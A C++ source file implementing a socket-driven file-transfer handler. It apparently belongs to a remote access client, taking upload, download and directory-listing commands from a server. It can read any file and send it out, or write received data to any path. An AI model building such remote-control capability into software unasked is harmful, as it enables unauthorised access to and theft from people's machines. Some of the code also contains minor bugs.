#include "FileTransfer.h"
#include "NetworkHelper.h"

FileTransfer::FileTransfer() {}

FileTransfer::~FileTransfer() {}

void FileTransfer::HandleHook(SOCKET s, const std::string& hook)
{
	if (hook.find(CMD_FILE_UPLOAD) != std::string::npos) {
		//> upload SIZE FILE_PATH
		std::string args = hook.substr(hook.find(' ') + 1);
		int filepos = args.find(' ');
		std::string path = args.substr(filepos + 1);
		int size = stoi(args);
		int readed = 0, to_read = BUFFER_READ;
		char buf[BUFFER_READ];
		
		HANDLE out = CreateFileA(path.c_str(), GENERIC_WRITE, NULL, NULL, CREATE_NEW, NULL, NULL);
		while (size) {
			readed = recv(s, buf, to_read, 0);
			if(!WriteFile(out, buf, readed, NULL, NULL)) return;
			size -= readed;
			if (size - BUFFER_READ < 0)
				to_read = size;
			else
				to_read = BUFFER_READ;
		}
		CloseHandle(out);
		NetworkHelper::SendString(s, "ok");
	}
	else if (hook.find(CMD_FILE_DOWNLOAD) != std::string::npos) {
		//> download FILE_PATH
		std::string file = hook.substr(hook.find(' ') + 1);
		if (std::filesystem::exists(file)) {
			std::string read;
			int size = std::filesystem::file_size(file);
			NetworkHelper::SendString(s, std::string{ "ok " } + std::to_string(size));
			NetworkHelper::RecvString(s, read);
			//server ready 
			if (read == "ok") {
				char buf[BUFFER_READ];
				int to_read;
				if (size > BUFFER_READ)
					to_read = BUFFER_READ;
				else
					to_read = size;
				DWORD readed = 0;
				HANDLE in = CreateFileA(file.c_str(), GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);

				while (size) {
					if(!ReadFile(in, buf, to_read, &readed, NULL)) return;
					send(s, buf, to_read, 0);

					size -= readed;
					if (size - BUFFER_READ < 0)
						to_read = size;
					else
						to_read = BUFFER_READ;
				}

				CloseHandle(in);
			}
		}
		else
			NetworkHelper::SendString(s, "404");
	}
	else if (hook.find(CMD_EXPLORER_LIST) != std::string::npos) {
		//> listdir <dirname>

		//send: type/size/name\n
		std::string dir = hook.substr(hook.find(' ') + 1);
		/*if (dir.length() > 2 && dir.at(dir.length() - 1) == '\\')
			dir = dir.substr(0, dir.length() - 2); //remove the last*/
#ifdef _DEBUG
		std::cout << "Dir: " << dir << std::endl;

#endif

		std::string out;
		if (std::filesystem::exists(dir) && std::filesystem::is_directory(dir)) {
			HANDLE hPerm = CreateFileA(dir.c_str(), GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);
			DWORD err = GetLastError();
			if (err != ERROR_ACCESS_DENIED) {
				if(hPerm != INVALID_HANDLE_VALUE)
					CloseHandle(hPerm);
				
				for (auto& f : std::filesystem::directory_iterator(dir)) {
					if (f.is_regular_file())
						out += "file/";
					else if (f._Is_symlink_or_junction())
						out += "link/";
					else
						out += "dir/";
					out += std::to_string(f.file_size());
					out = out + "/" + f.path().filename().string() + "\n";
				}
				NetworkHelper::SendString(s, out + '\n');
			}
			else {
				NetworkHelper::SendString(s, "noperm\n\n");
			}
		}
		else
			NetworkHelper::SendString(s, "notdir\n\n");

	}
}